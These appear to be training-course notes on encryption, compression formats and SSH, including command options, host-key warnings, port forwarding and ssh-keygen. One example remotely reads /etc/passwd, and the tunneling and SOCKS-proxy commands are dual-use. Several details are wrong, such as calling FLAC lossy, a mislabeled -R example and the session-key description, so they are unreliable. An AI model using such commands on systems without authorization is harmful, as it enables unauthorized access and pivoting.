Asymmetric encryption uses two different keys: a public key for encryption and a private key for decryption. It’s more computationally intensive but is essential for secure key exchange and digital signatures.
PKI (Public Key Infrastructure) is a framework that manages keys and certificates in asymmetric encryption systems.
Diffie-Hellman is used primarily for secure key exchange over an untrusted network but doesn’t directly encrypt data.
DSS (Digital Signature Standard) is used for signing messages, ensuring authenticity.
RSA is widely used for secure key exchange and digital signatures in asymmetric encryption.
Elliptic Curve Cryptography (ECC) offers stronger security with smaller keys, making it more efficient than RSA.
TLS & SSL

TLS (Transport Layer Security) and SSL (Secure Sockets Layer) protocols use both asymmetric and symmetric encryption for secure communication.
In TLS, protocols like RSA (for public-key encryption) and AES (for symmetric encryption) are used to ensure data confidentiality and integrity. Diffie-Hellman and Elliptic Curve algorithms are commonly used for key exchange.
PGP (Pretty Good Privacy)

PGP provides cryptographic privacy and authentication for emails and other forms of communication. It uses a combination of symmetric and asymmetric encryption to ensure message confidentiality and authenticity.
PGP can be used to encrypt messages and files.
It works by using a pair of keys: a public key for encryption and a private key for decryption.
PGP also supports digital signatures to verify the sender's identity and ensure the integrity of the message.
S/MIME (Secure/Multipurpose Internet Mail Extensions)

S/MIME is specifically designed for email encryption and signing. It is widely used for securing email communication by providing privacy, authentication, and integrity.
S/MIME uses a combination of public key infrastructure (PKI) and digital certificates to encrypt and sign messages.
Unlike PGP, which uses a decentralized trust model, S/MIME relies on centralized Certificate Authorities (CAs) to issue digital certificates and validate identities.
S/MIME is more commonly supported in enterprise environments and email clients.
OpenPGP

OpenPGP is an open standard based on PGP that allows for secure communications. It is designed to be interoperable across different platforms and implementations. OpenPGP and PGP serve similar purposes, but OpenPGP is more flexible and supports a wider range of cryptographic algorithms.
End-to-End Encryption (E2EE)

E2EE ensures that only the intended recipients of a message can decrypt and read it. It protects against eavesdropping even by intermediate parties, like servers. Popular applications such as messaging apps (e.g., WhatsApp) use E2EE to ensure privacy. While E2EE is typically implemented at the application layer, cryptographic operations related to key generation and encryption could involve the presentation layer for user-friendly rendering.
Layering of Encryption:

The Presentation Layer (Layer 6 of the OSI model) does indeed play a key role in encryption and decryption, especially for protocols like TLS and SSL. However, encryption at different layers (transport, application, or presentation) can depend on the use case. For instance:
TLS operates at the transport layer, securing data before it reaches the application layer, and is crucial for protocols like HTTPS.
PGP and S/MIME operate at the application layer, where email messages or files are encrypted before transmission.
Data Compression and Decompression:

The Presentation Layer can compress data to reduce its size before transmission, optimizing network bandwidth and speeding up data transfer. It decompresses the data upon receipt, restoring it to its original format.
Sometimes data gets to big to transmit over the network so the Presentation layer handles compression.The primary role of Data compression is to reduce the number of bits to be transmitted. It is important in transmitting multimedia such as audio, video, text etc.
Common compression formats include:

1. ZIP

Compression Method: DEFLATE (other methods can be used).
Key Features: Widely supported across platforms (Windows, macOS, Linux).
Pros:
Easy to use with native support in many systems.
Supports encryption and password protection.
Can archive multiple files/folders into one.
Cons:
Lower compression ratios compared to RAR or 7z.
2. TAR

Compression Method: No compression by default (often combined with gzip, bzip2, or xz).
Key Features: Used mainly on Linux/Unix systems for archiving large directories.
Pros:
Good for backing up directories and file systems.
Preserves file permissions and metadata.
Common in Linux/Unix environments.
Cons:
Requires additional tools for compression.
Less user-friendly on Windows.
3. RAR

Compression Method: Proprietary RAR algorithm.
Key Features: High compression ratios, can split archives into multiple parts.
Pros:
Higher compression ratios compared to ZIP.
Supports password protection and encryption.
Includes recovery records to fix damaged archives.
Cons:
Proprietary format; needs specialized software (e.g., WinRAR).
Less universally supported than ZIP.
4. 7z (7zip)

Compression Method: LZMA (default), can also use LZMA2, Bzip2, and PPMD.
Key Features: Open-source, supports high compression ratios and multi-threading.
Pros:
High compression ratio.
Open-source and free.
Supports encryption and solid compression.
Multi-threading for faster compression on multi-core systems.
Cons:
Slower compression, especially at higher settings.
Less widespread support (requires 7-Zip or compatible software).
5. CAB (Cabinet File Format)

Compression Method: LZX, Deflate.
Key Features: Developed by Microsoft, used mainly for software installation packages.
Pros:
Integrates well with Windows.
Supports encryption and digital signatures for secure distribution.
Cons:
Less popular for general data compression.
Compression ratios often lower than RAR or 7z.
Lossless Compression:

Lempel-Ziv (LZ) Compression: This family of algorithms, including LZ77 and LZ78, identifies repeated patterns in the data and replaces them with shorter codes, achieving compression without loss of information.
DEFLATE Compression: DEFLATE combines LZ77 with Huffman coding and is used in popular formats like ZIP, gzip, and PNG for lossless compression.
Run-Length Encoding (RLE): RLE replaces sequences of repeated data with a single value and a count, making it effective for compressing data with long runs of identical values.
Burrows-Wheeler Transform (BWT): BWT rearranges the characters in the input data to facilitate compression. It's often used in conjunction with other techniques like Move-to-Front (MTF) and Huffman coding.
Huffman Coding: Huffman coding generates variable-length codes for characters based on their frequencies in the input data, achieving efficient compression without loss of information.
Arithmetic Coding: Arithmetic coding encodes a sequence of symbols into a single floating-point number within a specified range, offering high compression ratios for lossless data.
Bzip2 Compression: Bzip2 uses the Burrows-Wheeler Transform (BWT) and Huffman coding to achieve high compression ratios, particularly effective for compressing text files.
Delta Encoding: Delta encoding compresses data by encoding the differences between consecutive values in a sequence, suitable for compressing data with predictable patterns or incremental updates.
PPM (Prediction by Partial Matching): PPM predicts the next symbol in a sequence based on its context, achieving high compression ratios for text and structured data.
LZMA (Lempel-Ziv-Markov chain Algorithm): LZMA combines LZ77 with additional modeling techniques like Markov chains for high compression ratios, commonly used in formats like 7z and XZ.
LZ77 and LZ78: These are foundational algorithms in the LZ family, used for identifying and encoding repeated patterns in data for compression.
Shannon-Fano Coding: Similar to Huffman coding, Shannon-Fano coding generates prefix codes based on symbol probabilities to achieve lossless compression.
Gzip Compression: Gzip uses DEFLATE compression and is commonly used for compressing files on Unix-based systems.
Zstandard (Zstd): Zstd is a modern compression algorithm that offers a good balance between compression speed and ratio, suitable for various types of data.
LZW (Lempel-Ziv-Welch) Compression: LZW is used in formats like GIF and compresses data by replacing repeating patterns with codes from a dictionary.
CAB (Cabinet File Format): CAB is a Microsoft-developed file archive format commonly used for software installation packages and system files, often employing the LZX compression algorithm.
Lossy Compression:

JPEG Compression: JPEG (Joint Photographic Experts Group) is widely used for compressing digital images. It achieves compression by discarding high-frequency information and optimizing color representation, resulting in smaller file sizes but some loss of image quality.
GIF Compression: Although GIF (Graphics Interchange Format) primarily supports lossless compression, it can also be used in a lossy mode by reducing the color palette or by discarding color information. This can result in smaller file sizes but may degrade image quality, particularly for complex images.
MPEG Compression: MPEG (Moving Picture Experts Group) is a suite of standards for compressing audio and video data. It typically uses lossy compression techniques such as motion compensation, discrete cosine transform (DCT), and quantization to achieve compression while maintaining perceptual quality.
MP3 Compression: MP3 is a popular lossy compression algorithm for audio data. It achieves compression by removing parts of the audio signal that are less audible to humans, such as frequencies outside the normal hearing range and quiet sounds masked by louder ones.
AAC (Advanced Audio Coding): AAC is a more advanced audio compression format compared to MP3. It offers better sound quality at lower bit rates and is commonly used for streaming audio and digital music distribution.
OGG Compression: OGG is a container format that typically uses lossy compression for audio data. It's often associated with the Vorbis codec, which offers high-quality audio compression at lower bit rates compared to formats like MP3.
WebP Compression: WebP is an image format developed by Google that uses both lossy and lossless compression techniques. It's designed to offer smaller file sizes and faster loading times for web images compared to formats like JPEG and PNG.
HEVC (High-Efficiency Video Coding): HEVC, also known as H.265, is a video compression standard that offers better compression efficiency compared to previous standards like H.264. It's widely used for streaming video and digital television.
FLAC (Free Lossless Audio Codec): Although FLAC is primarily a lossless compression format, it can also be used in a lossy mode where certain non-essential audio data is discarded to achieve smaller file sizes while still retaining high audio quality.
WAVPACK: WAVPACK is a hybrid audio compression format that offers both lossy and lossless compression modes. It's capable of achieving high compression ratios while preserving audio quality through its lossy mode.
DCT (Discrete Cosine Transform) Compression: DCT is commonly used in lossy compression algorithms for images and video, such as JPEG and MPEG. It transforms spatial data into frequency domain coefficients, allowing for efficient compression while sacrificing some image or video quality.


Resources


Instructor Note


3.3.2 Character set Mapping tables¶
ASCII


Extended ASCII


Unicode


UTF-8


UTF-16


Base64


URL


EBCDIC


Windows-1250


Windows-1252


ISO-8859-1


IBM Code Page 437


Shift-JIS


KOI8-R


BIG5


GB2312


GBK


Resources


Instructor Note


3.4 Explain OSI Layer 7 protocols and headers¶
Layer 7 of the OSI (Open Systems Interconnection) model is the Application Layer. It is the topmost layer of the OSI model and is responsible for providing network services directly to end-users or applications. Layer 7 protocols operate at the highest level of abstraction, dealing with the actual data that users work with.

Within this layer, protocols such as HTTP (Hypertext Transfer Protocol), SMTP (Simple Mail Transfer Protocol), and FTP (File Transfer Protocol) govern the intricate communication between software applications and the network. These protocols are intricately linked with application-level headers, meticulously managing metadata and control information, thereby fostering highly efficient communication between the application and the underlying network infrastructure.



Resources


Instructor Note


3.4.1 Analyze Telnet protocol¶
Telnet (TCP 23)

Developed in 1969, Telnet is a protocol used for remotely accessing and managing network devices, servers, and computers over a TCP/IP network. It allows a user to establish a terminal session on a remote host, providing command-line access to the remote system as if the user were physically present at the console. It has fallen out of favor with the development of packet sniffers being able to capture the usernames and passwords of systems. Newer (more secure) protocols like SSH are preferred.






Resources


Instructor Note


3.4.2 Analyze Secure Shell Protocol (SSH)¶
SSH (TCP 22)

The Secure Shell (SSH) protocol is a cryptographic network protocol used for secure remote login and command execution over an unsecured network. SSH provides strong encryption, authentication, and integrity protection, making it a widely used and trusted method for remote access and secure communication.

Delveloped by Tatu Ylönen in Finland 1995 who was a researcher for Finland's Helsinki University of Technology. Due to packet sniffing attacks of protocols like telnet, rlogin, and FTP, a more secure protocol was needed.







SSH Protocol

SSH is an open protocol with many different implementations. Examples include PuTTy, Solaris Secure Shell, Bitvise, and OpenSSH. OpenSSH is the open source implementation that is most common and the focus of this course as it is widely found in Linux and Unix. Support for Windows was introduced when OpenSSH was ported to run in Windows Power Shell in 2015. It is included in Windows 10 as of 2018, though it must be enabled in settings.
History of the protocol and implementations:

Due to the way SSH was created it has many implementations and therefore is open to vulnerabilities across those different implementations. This course will focus mainly on the OpenSSH implementation.

SSH was developed in 1995 after a password sniffing attack occurred at the University of Technology in Finland. A researcher at the university created SSH1 for himself, which rapidly gained popularity with over 20,000 users by the end of 1995. The creator also founded the SSH Communications Security Corp (SCS) to maintain and develop SSH. That same year, an IETF was drafted describing operation of the SSH1 software and assigned a working group (SECSH). The group submitted a draft for SSH-2.0 in February 1997 which was then released by SCS as a software product with a restrictive license. Due to restrictions many people continued to use SSH1 until OpenSSH was released. OpenSSH came from the OpenBSD project and is based on the last free release of SSH, 1.2.12, but due to the open source community it has been updated regularly and ported to many platforms.

Versions

SSH-1: SSH-1 was the original version developed by Tatu Ylönen in 1995. It used the RSA algorithm for key exchange and authentication. Vulnerabilities in SSH-1, such as weak cryptography and potential man-in-the-middle attacks, led to its replacement by SSH-2.

SSH-2: SSH-2 was developed to address the weaknesses of SSH-1. Introduced stronger encryption algorithms, including Diffie-Hellman key exchange, AES, and 3DES for encryption. Enhanced security features such as integrity checking, improved authentication methods (including public-key cryptography with DSA and RSA), and support for X.509 certificates. SSH-2 also standardized the protocol format and message exchange for interoperability across different implementations.

OpenSSH: OpenSSH is the most widely used implementation of SSH. It was developed as a free and open-source alternative to the original SSH software suite. OpenSSH includes the core components of SSH-2, providing secure remote access (SSH), secure file transfer (SFTP), and secure tunneling (SSH tunneling). OpenSSH is integrated into many Unix-like operating systems, including Linux, BSD variants, and macOS, making it a standard tool for system administration and secure communications.

SSH-1.99: Some implementations and tools identify themselves as SSH-1.99 to indicate compatibility with both SSH-1 and SSH-2 protocols. This allowed for a transition period where systems could support both versions of SSH during the migration from SSH-1 to SSH-2.

PuTTY: A free SSH connection tool for Windows that's often used to remotely log in to a device using SSH.

Tectia SSH: A commercial implementation of the Secure Shell (SSH) protocol suite, developed by a company formerly known as SSH Communications Security and now operating under the name Tectia Corporation.



Usage and features:

SSH was initially created to replace insecure rsh suite of Unix programs; the syntax and user interface is identical. These services included the following:
rsh Suite	SSH Replacement	Description
rsh	ssh	Provides a channel for running a shell on a remote computer
rlogin	slogin	Provides remote login capability
rcp	scp	Login programs such as telnet, remote login (rlogin), and rsh (remote shell). Though the initial use was logging into and running remote terminal sessions, capabilities were expanded to replace FTP (file transfer protocol) and RCP (remote copy protocol) with SFTP and SCP respectively.


SSH uses these encryption techniques:

Asymmetric Encryption for:

Key Exchange: When an SSH connection is initiated, the client and server perform a key exchange protocol (such as Diffie-Hellman key exchange). This protocol allows them to securely establish a shared secret key over an insecure network. Asymmetric encryption algorithms (such as RSA or Elliptic Curve Cryptography) are used during this process.

Key Exchange Algorithms:
Diffie-Hellman (DH): A key exchange algorithm used to establish a shared secret key between the client and server during the initial connection setup.
Elliptic Curve Diffie-Hellman (ECDH): A variant of Diffie-Hellman that uses elliptic curve cryptography for key exchange, offering strong security with smaller key sizes compared to traditional DH.
Curve25519: A specific elliptic curve algorithm designed for efficient and secure key exchange.
Authentication: SSH also employs asymmetric encryption for user authentication. The client and server exchange public keys during the key exchange phase, and the client uses its private key to sign a challenge provided by the server. The server verifies the client's identity by checking the signature against the client's public key.

Public Key Algorithms:

RSA (Rivest-Shamir-Adleman): A widely used public key algorithm for digital signatures and encryption. SSH uses RSA for key authentication and digital signatures.
DSA (Digital Signature Algorithm): An older public key algorithm, less commonly used in SSH compared to RSA.
ECDSA (Elliptic Curve Digital Signature Algorithm): A variant of DSA that uses elliptic curve cryptography for digital signatures, offering strong security with smaller key sizes.


User Keys:

User keys are associated with individual users and are used for user authentication. They are typically generated by the client (user) and stored on the client-side.
User keys are asymmetric, consisting of a public key and a private key pair.
The user's private key is kept securely on the client's machine, while the public key is uploaded to the remote server.
Clents send their asymmetric public keys to the server to identify themselves to the server.
Host Keys:

Host keys, also known as server keys, are associated with SSH servers.
They serve as an identifier and ensure the integrity of the server during the initial connection.
Host keys are generated on the server-side and are used to verify the server's identity and protect against man-in-the-middle attacks.
Servers send their asymmetric public keys to the client to identify themselves to the client.
These host keys are saved by the Linux client into the /home/<user>/.ssh/know_hosts file.


.ssh/known_hosts
Servers send their asymmetric public keys to the client to identify themselves to the client. Clients will save these keys in the .ssh/known_hosts file in their home directory. Should connection to a remote server receive a different HOST key the system will generate a warning to the client.


ssh student@172.16.82.106
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:RO05vd7h1qmMmBum2IPgR8laxrkKmgPxuXPzMpfviNQ.
Please contact your system administrator.
Add correct host key in /home/student/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/student/.ssh/known_hosts:1
remove with:
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
ECDSA host key for 172.16.82.106 has changed and you have requested strict checking.
Host key verification failed.
Symmetric Encryption:
Session Key:
Once the asymmetric public key exchange is completed, the client will derive the shared symmetric session key.
The client encrypt the session key using the public key (host key) of the server and send it to the server.
Once the server decrypts the session key using its private key they will use symmetric encryption for the remaining duration of the SSH session.
A symmetric encryption algorithm (such as AES) is commonly used to encrypt the session data.
The shared secret key is securely generated from the key exchange process and shared only between the client and server.
Symmetric Encryption Algorithms:
AES (Advanced Encryption Standard): A widely used symmetric encryption algorithm known for its security and efficiency. SSH supports various key lengths (e.g., AES-128, AES-192, AES-256) for AES encryption.


Resources


Instructor Note


3.4.2.1 Components of SSH Architecture¶


In order for ssh to work properly between a client and server, several components are required:

Server: Known as sshd in most linux SSH implementations, this allows incoming SSH connections and handles authentication and authorization.

Clients: This is the program that connects to the SSH server for a request, examples include scp and ssh

Sessions: The client and server conversation that begins after successful mutual authentication.

Keys: There are several keys that are used in SSH:

User Key - Asymmetric Public key created used to identify the user to a server (generated by the user)
Host Key - Asymmetric Public key created to identify a server to a user (generated by an administrator)
Session Key - Symmetric Key created by the client and the server that protects the communication for a particular session
Key Generator: Creates user keys and host keys via ssh-keygen

Known-hosts database: Collection of host keys that the client and server refer to for mutual authentication.

Agent: Stores keys in memory as a convenience for users to not input pass-phrases repetitively.

Signer: This is a program that signs the hostbased authentication packets.

Random Seed: Random data used for entropy in creating pseudo-random numbers

Configuration File: Settings that exist on either the client or server that dictate functionality for ssh or sshd respectively

Client Configuration File (~/.ssh/config or /etc/ssh/ssh_config): The client-side SSH configuration file allows users to specify settings for SSH connections initiated from the local system.
Server Configuration File (/etc/ssh/sshd_config): The server-side SSH configuration file specifies settings and options for the SSH daemon (sshd) running on the remote server.
Known Hosts File (~/.ssh/known_hosts): The known hosts file stores the public keys of remote hosts that the SSH client has previously connected to.


Resources


Instructor Note


3.4.2.2 SSH Architecture¶






Defined in RFC 4251, there are three major protocols are run on top of TCP to facilitate an SSH Connection:

SSH-TRANS

This can be thought of as the building block that provides initial connection, server authentication, basic encryption, integrity services, and compression if needed. SSH-TRANS, or the SSH Transport Layer Protocol, is responsible for establishing a secure, encrypted channel between the SSH client and server. Once this is established, a client has a secure full duplex stream to an authenticated remote peer.

Connection Establishment:

Three-way handshake occurs when the client requests a connection establishment to the server's TCP port 22 by default. Another port can be specified with the use of the (-p port) option.
Client and server exchanges their SSH protocol versions to ensure compatibility.
Key Exchange (KEX):

Client and Server exchange their public keys (User and Host respectively).
Integrity Protection:

SSH-TRANS employs integrity-checking mechanisms such as HMAC (Hash-based Message Authentication Code) to verify data integrity and detect any tampering during transmission.
Encryption:

SSH client and server agree on a key exchange algorithm (such as Diffie-Hellman, ECDH, or others) to securely negotiate a shared secret.
Server Authentication:

SSH-TRANS includes mechanisms for server authentication, where the server presents its digital certificate to prove its identity to the client, preventing man-in-the-middle attacks.
SSH-USERAUTH

This component is sent over the SSH-TRANS connection and used to authenticate with the client with the server. During this stage the client learns about format of authentication requests, conditions, and available methods of authentication. SSH uses algorithms in compliance with DSS defined in FIPS PUB 186-4. (RSA, DSA, etc.) Most commonly this will be RSA.

Authentication Methods:

SSH-USERAUTH supports various authentication methods, including:

Password authentication

Public-key cryptography (RSA, DSA, ECDSA) (-i ~/.ssh/id_rsa)

Keyboard-interactive authentication (e.g., challenge-response mechanisms)

Certificate-based authentication (X.509)

Authorization:

Once authenticated, SSH-USERAUTH handles authorization checks to determine the level of access and privileges granted to the authenticated user on the server.
SSH-CONNECT

SSH-CONNECT, or the SSH Connection Protocol, manages the interactive sessions and secure shell access between the SSH client and server. This component provides the exciting things over a single pipe that is provided by SSH-TRANS. It includes support for multiple interactive and non-interactive sessions. It multiplexes several channels through the underlying connections to allow for TCP, X, and agent forwarding, terminal handling, remote program execution.

Shell Access:

Interactive shell sessions (command-line access) where users can execute commands and interact with the remote server's operating system.
Non-interactive SSH sessions are commonly used in automated scripts or batch jobs where commands or operations need to be executed on a remote system without manual intervention.
Secure File Transfer:

Secure file transfer operations using protocols like SCP (Secure Copy Protocol) or SFTP (Secure File Transfer Protocol), which runs over the SSH connection.
Port Forwarding:

SSH tunneling (port forwarding), allowing clients to securely tunnel other network protocols (e.g., HTTP, database connections) over the SSH connection.
(-L) Local Port Forward
(-R) Remote Port Forward
(-D) Dynamic Tunnel (SOCKS Proxy)
Session Management:

SSH-CONNECT manages the lifecycle of SSH sessions, including session setup, maintenance, and termination, ensuring efficient and secure communication between the client and server.
X11 Forwarding (-X):

Negotiate the capability to forward X11 (graphical) applications from the server to the client securely over the SSH connection.
Terminal Settings:

Terminal Type and Size: Specify the terminal type (e.g., xterm, vt100) and size (rows and columns) for the SSH session.
Logging and Debugging (-v, -vv, -vvv):

Logging Levels: Determine the level of logging and debugging information to be captured during the SSH session for troubleshooting purposes.
Compression (-C):

Compression Algorithms: Specify whether data compression will be used to reduce bandwidth usage during the SSH session (e.g., zlib compression).
Connection Settings:

Session Multiplexing: Decide whether multiple logical SSH sessions can share a single underlying network connection (improving efficiency).
Window and Buffer Sizes: Negotiate the size of data windows and buffers used for transmitting data between the client and server.


Resources


Instructor Note


3.4.2.3 SSH Implementation Concerns¶
Authentication

There are several methods used by SSH for authentication, the following are the most common implementations:

Password Authentication:
This is performed with help from the host operating system, which maintains the user and password association. The password must be transmitted to the remote server during authentication. This is the traditional way SSH works in most situations.

Cryptographic Key Authentication:
This is performed using the "ssh-keygen" command to generate a public and private key pair. The public key must be installed on the SSH server, while the private key remains on the host machine. It is extremely important to create a passphrase when prompted during the key generation process. If this is not performed and the key is stolen, credentials are compromised and anyone can perform actions on behalf of the owner of the key.



Password Authentication Debug Demo


Resources


Instructor Note


3.4.2.4 SSH Usage¶
SSH is used on a client to remotly authenticate to a server. The basic syntax is as such:


$ ssh {user}@{ip} 

$ ssh student@172.16.82.106
If the {user} username is not specified then the currently logged in username is assumed. So if all the accounts were the same on each computer then the username is not needed. However, if any system does not use the currently logged in user account then it must be specified.

Some additional switches that can be added to the SSH syntax are (more information can be found in the ssh manual):

-p {port} = This specifies the alternate port to be used. When connecting to a server the assumed default port to connect to is port 22. Should you need to specify a different port then the -p switch is used followed by the port.

Assuming the SSH port of 172.16.82.106 was 1234. ssh student@172.16.82.106 -p 1234

If you already had an SSH tunnel created you can call on that port to authenticate to the server on the other end. ssh student@localhost -p 1234

-l {username} = This is to specify the username to use when authenticating to the remote server. This is the same as {username]@{ip}. ssh 172.16.82.106 -l student

{command} = Optional command to execute on the remote host after establishing the SSH connection. If provided, SSH will execute the command on the remote host and then return the output to the local terminal. If not provided, SSH will start an interactive shell session on the remote host. ssh student@172.16.82.106 cat /etc/passwd

-X = This will enable X11 graphics to be forwarded from the server to the client. This will allow you to open graphical applications such as pcmanfm, gimp, eog, eom, firefox, terminator, and more. ssh student@172.16.82.106 -X

-v = Enables verbose mode, which provides detailed debugging information about the SSH connection process. This can be helpful for diagnosing connection issues or troubleshooting SSH configuration problems. ssh student@172.16.82.106 -v

-f = Requests SSH to go to the background just before command execution. This is useful when running SSH commands as part of scripts or automation tasks. This is not to be confused with the & option which is used to background most applications. ssh student@172.16.82.106 -f

-i {identity file} = Selects a file from which the identity (private key) for RSA or DSA authentication is read. The default is ~/.ssh/identity for protocol version 1, and ~/.ssh/id_rsa and ~/.ssh/id_dsa for protocol version 2. ssh student@172.16.82.106 -i idfile.pub

-F {config file} = Specifies an alternative per-user configuration file. If a configuration file is given on the command line, the system-wide configuration file (/etc/ssh/ssh_config) will be ignored. The default for the per-user configuration file is ~/.ssh/config. ssh student@172.16.82.106 -F my.config

-N = Requests that no command be executed on the remote server after establishing the SSH connection. This can be useful when setting up port forwarding or establishing a tunnel without running a command on the remote server. ssh student@172.16.82.106 -NT

-T = Disables pseudo-terminal allocation, preventing the allocation of a terminal on the remote server. This can be useful when executing commands that do not require interaction or terminal emulation. ssh student@172.16.82.106 -NT

-C = Enables compression of data during transmission over the SSH connection, reducing bandwidth usage, especially over slow or high-latency connections. ssh student@172.16.82.106 -C

-J user@host = Specifies a jump host to connect through when establishing the SSH connection. This simplifies the process of connecting to a remote host that is not directly accessible from the local machine. ssh -J student@10.10.0.40, student@172.16.1.15, student@172.16.40.10 student@172.16.82.106

-L [bind_address:]port:host:hostport = Sets up local port forwarding, allowing connections to a local port to be forwarded over the SSH tunnel to a specified host and port on the remote server. This can be useful for accessing services running on a remote server through a secure tunnel. ssh student@172.16.82.106 -L 1234:192.168.1.10:22

-R [bind_address:]port:host:hostport = Sets up remote port forwarding, allowing connections to a specified port on the remote server to be forwarded over the SSH tunnel to a host and port on the local machine or another remote server. This can be useful for exposing services running on the local machine to the remote server or other remote machines. ssh student@10.10.0.40 -L 1234:172.16.40.10:22

-D {port} = Specifies a local "dynamic" port forwarding port. This creates a SOCKS proxy on the specified port, allowing other applications to tunnel their traffic through the SSH connection securely. ssh student@172.16.1.15 -D 9050



Resources


Instructor Note


3.4.2.5 SSH First Time Connecting¶
When connecting to an SSH server for the first time, the client will try to verify the server's Host key. The client will check the ~/.ssh/known_hosts file to see if the public key is already known. If it is not then the system will prompt the client if they trust this system. The user is required to type 'yes' or 'no'. Should the user say 'yes' then that public key will be save in the ~/.ssh/known_hosts file.


student@internet-host:~$ ssh student@172.16.82.106
The authenticity of host '172.16.82.106 (172.16.82.106)' can't be established.
ECDSA key fingerprint is SHA256:749QJCG1sf9zJWUm1LWdMWO8UACUU7UVgGJIoTT8ig0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.82.106' (ECDSA) to the list of known hosts.
student@172.16.82.106's password:
student@blue-host-1:~$
Key Fingerprint: The SSH client presents the host key fingerprint. This is a unique identifier of the server's SSH key.



Resources


Instructor Note


3.4.2.6 SSH Re-Connect¶
When re-connecting to the server it will no longer prompt to verify or save the server's public key. This is because the server's public key will match a key in the ~/.ssh/known_hosts file.


ssh student@172.16.82.106
student@172.16.82.106's password:
student@blue-host-1:~$


Resources


Instructor Note


3.4.2.7 SSH Host Key Changed¶
When you see the warning "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!" while trying to SSH into a server, it typically means that the SSH client has detected that the host key of the server you are trying to connect to has changed since the last time you connected. This could happen for various reasons, including:

Server Reinstallation or Upgrade: If the server has been reinstalled or upgraded, it might have generated a new host key.

Man-in-the-Middle Attack: Someone might be attempting to intercept your connection to the server by presenting a different host key.

Server Configuration Change: The server administrator might have intentionally changed the host key for security reasons.




ssh student@172.16.82.106
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:RO05vd7h1qmMmBum2IPgR8laxrkKmgPxuXPzMpfviNQ.
Please contact your system administrator.
Add correct host key in /home/student/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/student/.ssh/known_hosts:1
remove with:
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
ECDSA host key for 172.16.82.106 has changed and you have requested strict checking.
Host key verification failed.


Resources


Instructor Note


3.4.2.8 SSH Host Key Changed Fix¶
If you are able to verify that the server's key change was due to a reload, you can remove the conflicting Host key using the provided ssh-keygen command. After removing the key entry it will then prompt you to save the new key again.

Steps to Resolve:

Verify the Change: If you are connecting to a server you manage or one whose administrator you know, contact them to confirm whether the host key has indeed changed.

Remove the Old Key: Your SSH client stores known host keys in the known_hosts file. If you are sure the change is legitimate, you can edit this file to remove the old entry for the server in question. On Unix-like systems, this file is usually located in ~/.ssh/known_hosts.


ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
Connect Again: After removing the old key, try to SSH into the server again. This time, the SSH client should prompt you to add the new host key to your known_hosts file.

student@internet-host:~$ ssh student@172.16.82.106
The authenticity of host '172.16.82.106 (172.16.82.106)' can't be established.
ECDSA key fingerprint is SHA256:749QJCG1sf9zJWUm1LWdMWO8UACUU7UVgGJIoTT8ig0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.82.106' (ECDSA) to the list of known hosts.
student@172.16.82.106's password:
student@blue-host-1:~$


Resources


Instructor Note


3.4.2.9 SSH Files¶
Known-Hosts Database:

The ~/.ssh/known_hosts file is a file used by SSH clients to store the fingerprints of remote hosts that the user has connected to. Each time you connect to a remote SSH server, the client checks the server's fingerprint against the entries in the known_hosts file to ensure that you're connecting to the correct server.


.ssh/known_hosts


Configuration Files

/etc/ssh/ssh_config:

This file is the system-wide configuration file for the SSH client. It contains configuration options that apply to all users on the system when they use SSH to connect to remote servers.
Typical settings in the ssh_config file include options like specifying default usernames, enabling or disabling SSH features such as X11 forwarding or agent forwarding, configuring proxy settings, setting default encryption algorithms, and defining custom SSH aliases.
Users can also have their own ~/.ssh/config file in their home directory, which overrides settings from the system-wide ssh_config file for their individual SSH sessions.
/etc/ssh/sshd_config:

This file is the system-wide configuration file for the SSH server (sshd). It contains configuration options that apply to the SSH server daemon running on the system.
Typical settings in the sshd_config file include options for configuring SSH server authentication methods (e.g., password authentication, public key authentication), specifying which users or groups are allowed to access the SSH server, setting restrictions on SSH sessions (e.g., maximum number of concurrent connections, idle session timeout), and configuring logging and auditing options.
Changes made to the sshd_config file usually require restarting the SSH server for the new settings to take effect.
sudo systemctl restart ssh


/etc/ssh/ssh_config


/etc/ssh/sshd_config
To view the current configured SSH port

To view the current configured SSH port on your system, you'll need to check the SSH configuration file. Here's how you can do it on different operating systems:

Linux: On Linux systems, SSH configuration is typically managed through the sshd_config file located in /etc/ssh/.

cat /etc/ssh/sshd_config | grep Port
Edit file to change the SSH Port


sudo nano /etc/ssh/sshd_config
Restart the SSH Service

Restarting the SSH service can be necessary for various reasons, such as applying configuration changes, resolving connectivity issues, or after making updates. Here’s how you can restart the SSH service depending on your operating system:

Restart SSH Service:

sudo systemctl restart ssh
Start SSH Service (if not running):


sudo systemctl start ssh
Stop SSH Service:


sudo systemctl stop ssh
Check SSH Service Status:


sudo systemctl status ssh


Resources


Instructor Note


3.4.2.10 SSH-Keygen¶
The ssh-keygen command is a tool used to generate SSH key pairs for authentication purposes. SSH keys are cryptographic keys used to authenticate and establish secure connections between a client (your local machine) and a server without the need for a password.


ssh-keygen -t rsa -b 4096 -C "Student"
    Generating public/private rsa key pair.
    Enter file in which to save the key (/home/student/.ssh/id_rsa): 
    Enter passphrase (empty for no passphrase): 
    Enter same passphrase again: 
